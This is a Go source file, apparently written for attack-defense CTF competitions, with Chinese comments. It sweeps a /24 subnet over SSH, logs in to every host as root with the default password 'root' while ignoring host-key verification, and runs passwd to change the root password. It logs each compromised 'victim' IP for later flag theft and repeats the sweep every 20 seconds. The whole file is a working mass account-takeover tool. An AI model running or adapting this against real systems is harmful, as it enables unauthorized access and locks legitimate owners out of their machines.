package main

import (
	"fmt"
	"golang.org/x/crypto/ssh"
	"os"
	"sync"
	"time"
) /*批量改
 */

// 更改
var oldpassword = "root"          //默认密码			要改 1
var newpssword = "@"              //更改后的新密码
var storekeyFile = "otherkey.txt" //保存修改密码信息的文件
var Iplist = "iplist.txt"         //纯受害者ip,方便读取然后弄flag

var myip = 43    //要改 1
var platform = 0 //要改 1

var Qip = "192.168.222." //网段							要改 1
var webport = 22         //web靶机ssh开放的端口			要改 1
var pwnport = 22         //pwn靶机ssh开放的端口			要改 1

var first = 1    //起始									要改
var finall = 254 //最后									要改

var err error
var wg sync.WaitGroup

func FileExists(name string) bool {
	_, err := os.Stat(name)
	if err != nil {
		return false
	}
	return true
}

func changewebPassword(oldpassword, newpassword, server string) bool { // SSH 连接配置
	sshConfig := &ssh.ClientConfig{
		User:            "root",                                      // 填写 SSH 用户名		要改
		Auth:            []ssh.AuthMethod{ssh.Password(oldpassword)}, // 填写 SSH 密码
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),                 // 忽略主机密钥验证
		Timeout:         30 * time.Second,
	}

	// 创建与服务器的连接
	client, err := ssh.Dial("tcp", server, sshConfig)
	if err != nil {
		fmt.Println(server, "连接失败")
		return false
	}
	defer client.Close()

	// 开始一个新的 SSH 会话
	session, err := client.NewSession()
	if err != nil {
		fmt.Println("Failed to create session: %v", err)
		return false
	}
	defer session.Close()

	// 使用 passwd 命令修改密码
	cmd := fmt.Sprintf("echo -e '%s\n%s\n%s' | passwd", oldpassword, newpassword, newpassword)

	// 执行命令
	output, err := session.CombinedOutput(cmd)
	if err != nil {
		fmt.Println("Failed to change password: %v", err)
		return false
	}

	// 输出结果
	fmt.Println(string(output))
	return true

}
func changepwnPassword(oldpassword, newpassword, server string) bool { // SSH 连接配置
	sshConfig := &ssh.ClientConfig{
		User:            "root",                                      // 填写 SSH 用户名		要改
		Auth:            []ssh.AuthMethod{ssh.Password(oldpassword)}, // 填写 SSH 密码
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),                 // 忽略主机密钥验证
		Timeout:         30 * time.Second,
	}

	// 创建与服务器的连接
	client, err := ssh.Dial("tcp", server, sshConfig)
	if err != nil {
		fmt.Println(server, "连接失败")
		return false
	}
	defer client.Close()

	// 开始一个新的 SSH 会话
	session, err := client.NewSession()
	if err != nil {
		fmt.Println("Failed to create session: %v", err)
		return false
	}
	defer session.Close()

	// 使用 passwd 命令修改密码
	cmd := fmt.Sprintf("echo -e '%s\n%s\n%s' | passwd", oldpassword, newpassword, newpassword)

	// 执行命令
	output, err := session.CombinedOutput(cmd)
	if err != nil {
		fmt.Println("Failed to change password: %v", err)
		return false
	}

	// 输出结果
	fmt.Println(string(output))
	return true

}

func main() {
	//保存密码的文件
	//在判断外部定义keyfile，使keyfile可以被判断外部的语句访问
	var keyfile *os.File
	if FileExists(storekeyFile) == false {

		keyfile, err = os.Create(storekeyFile)

		if err != nil {
			fmt.Println("文件打开失败")
		}
	} else {
		keyfile, err = os.OpenFile(storekeyFile, os.O_APPEND|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Println("文件打开失败", err)
		}

	}
	defer keyfile.Close()

	//保存受害者ip的文件
	var iplist *os.File
	if FileExists(Iplist) == false {
		iplist, err = os.Create(Iplist)
		if err != nil {
			fmt.Println("创建文件失败")
		}
	} else {
		iplist, err = os.OpenFile(Iplist, os.O_APPEND|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Println("打开文件失败")
		}
	}
	defer iplist.Close()
	for {

		//循环修改密码
		for i := first; i <= finall; i++ {
			if i == myip || i == platform {
				continue
			}
			wg.Add(2)
			go func() {
				server := fmt.Sprintf("%s%d:%d", Qip, i, webport)
				b := changewebPassword(oldpassword, newpssword, server)

				if b == true {
					fmt.Println("已将Web ip" + server + "的ssh密码更改为:" + newpssword + " ;time" + time.Now().Format("2006-01-02 15:04:05"))
					//保存修改后的密码信息
					keyfile.WriteString("已将Web ip" + server + "的ssh密码更改为:" + newpssword + " ;time" + time.Now().Format("2006-01-02 15:04:05") + "\n")
					//保存受害ip
					iplist.WriteString(server + "\n")
				}
				wg.Done()
			}()
			go func() {
				server := fmt.Sprintf("%s%d:%d", Qip, i, pwnport)
				b := changepwnPassword(oldpassword, newpssword, server)

				if b == true {
					fmt.Println("已将Pwn ip" + server + "的ssh密码更改为:" + newpssword + " ;time" + time.Now().Format("2006-01-02 15:04:05"))
					//保存修改后的密码信息
					keyfile.WriteString("已将Pwn ip" + server + "的ssh密码更改为:" + newpssword + " ;time" + time.Now().Format("2006-01-02 15:04:05") + "\n")
					//保存受害ip
					iplist.WriteString(server + "\n")
				}
				wg.Done()
			}()
		}

		wg.Wait() //等待协程完毕

		time.Sleep(20 * time.Second)
	}
}
